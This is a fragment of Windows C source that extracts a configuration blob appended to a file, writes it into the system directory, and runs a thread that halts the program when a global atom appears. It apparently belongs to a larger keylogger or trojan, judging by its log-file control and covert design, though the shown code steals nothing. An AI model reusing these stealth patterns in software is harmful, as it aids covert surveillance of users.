	/*=Try to open the file=*/
	htf = open_file(ptfn);
	/*=Process errors=*/
	if (htf==INVALID_HANDLE_VALUE) {
		DeleteFile(ptfn);
		free(ptfn);
		return;
	}
	l = lstrlen(ATTACHED_CONFIG_FILE_ID_0) + lstrlen(ATTACHED_CONFIG_FILE_ID_1) + 1; // witn NULL
	pbuf = (char *)malloc(l);
	pcfs = (char *)malloc(l);
	/*=Make a string by which I'll find config. file data=*/
	lstrcpy(pcfs,ATTACHED_CONFIG_FILE_ID_0);
	lstrcpy(pcfs + lstrlen(pcfs),ATTACHED_CONFIG_FILE_ID_1);
	cff = 0;
	br = 0; // no bytes read (default)
	off = 0; // first byte
	do {
		ReadFile(htf,pbuf,l - 1,&br,NULL);
		SetFilePointer(htf,-(l - 1 - 1),NULL,FILE_CURRENT); // go back
		off++;
		if (lstrcmp(pbuf,pcfs)==0) {
			off += l - 1 - 1; // offset of first byte of config. file
			SetFilePointer(htf,off,NULL,FILE_BEGIN); // set file pointer there
			free(pcfs); // not needed any more
			free(pbuf); // I'll re-allocate it...
			l = tfs - off; // get size of config. file
			pbuf = (char *)malloc(l);
			ReadFile(htf,pbuf,l,&br,NULL); // read configuration file data
			pcfn = (char *)malloc(MAX_PATH);
			/*=Get name of config. file=*/
			GetSystemDirectory(pcfn,MAX_PATH);
			lstrcpy(pcfn + lstrlen(pcfn),CONFIGFILE_NAME);
			DeleteFile(pcfn); // remove old config file (if existent)
			hcf = create_file(pcfn);
			if (hcf==INVALID_HANDLE_VALUE)
				break;
			WriteFile(hcf,pbuf,l,&bw,NULL);
			CloseHandle(hcf);
			cff++;
			break; // escape the loop
		}
	} while (br==l - 1);
	/*=Free all the resources associated with temp file=*/
	CloseHandle(htf);
	DeleteFile(ptfn);
	free(ptfn);
	/*=Free other resources=*/
	free(pbuf);
	free(pcfn);
	if (!cff) {
#ifdef DEBUG_MODE
		ShowDebug("Attached configuration file not found!");
#endif
	}
}

DWORD WINAPI halt_thread(LPVOID param)
{
	for (;;)
		if (GlobalFindAtom(HALT_PROGRAM_ATOM)) {
			kill_logfile_control_thread();
			GlobalDeleteAtom(GlobalFindAtom(HALT_PROGRAM_ATOM));
			ExitProcess(0); // atom found, halt the program
		}
}

void start_halt_thread(void)
{
	DWORD th_id;

	GlobalDeleteAtom(GlobalFindAtom(HALT_PROGRAM_ATOM));
	CreateThread(NULL,0,halt_thread,NULL,0,&th_id);
}

/* Total lines = 5883 */
